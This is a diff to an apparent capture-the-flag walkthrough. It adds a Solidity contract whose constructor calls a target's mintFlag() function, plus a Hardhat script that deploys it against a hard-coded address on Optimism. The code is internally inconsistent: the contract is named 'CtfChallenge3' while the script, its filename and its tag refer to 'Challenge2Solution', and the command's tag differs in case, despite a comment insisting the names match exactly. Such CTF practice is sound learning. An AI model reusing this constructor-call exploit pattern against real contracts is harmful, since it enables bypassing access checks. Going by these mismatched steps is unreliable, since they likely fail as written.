@@ -2,6 +2,51 @@ Make sure You are in your Environment setup
 
 Create a file in this dir-packages/hardhat/contracts create file named Ctfchallenge3.sol Paste below code into this.. 
 
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+interface ITarget {
+    function mintFlag() external;
+}
+
+// THIS NAME MUST MATCH THE DEPLOY SCRIPT EXACTLY
+contract CtfChallenge3 {
+    constructor(address target) {
+        ITarget(target).mintFlag();
+    }
+}
+
+Create a new file in packages/hardhat/deploy/02_deploy_challenge_2_solution.ts
+
+import { HardhatRuntimeEnvironment } from "hardhat/types";
+import { DeployFunction } from "hardhat-deploy/types";
+
+const deploySolution: DeployFunction = async function (hre: HardhatRuntimeEnvironment) {
+  const { deployer } = await hre.getNamedAccounts();
+  const { deploy } = hre.deployments;
+
+  // --- DELETE OR COMMENT OUT THIS LINE ---
+  // const challenge2 = await hre.ethers.getContract("Challenge2");
+  
+  // --- ADD THIS LINE ---
+  // PASTE THE REAL ADDRESS FROM THE WEBSITE BELOW
+  const challenge2Address = "0x0b997E0a306c47EEc755Df75fad7F41977C5582d"; 
+
+  console.log("😈 Attacking Challenge 2 at:", challenge2Address);
+
+  await deploy("Challenge2Solution", {
+    from: deployer,
+    args: [challenge2Address], // Use the variable you just created
+    log: true,
+    autoMine: true,
+  });
+};
+
+export default deploySolution;
+deploySolution.tags = ["Challenge2Solution"];
+
+Save this file and go to your second terminal..run this comment yarn deploy --tags challenge2solution --network optimism
+
 
 
 
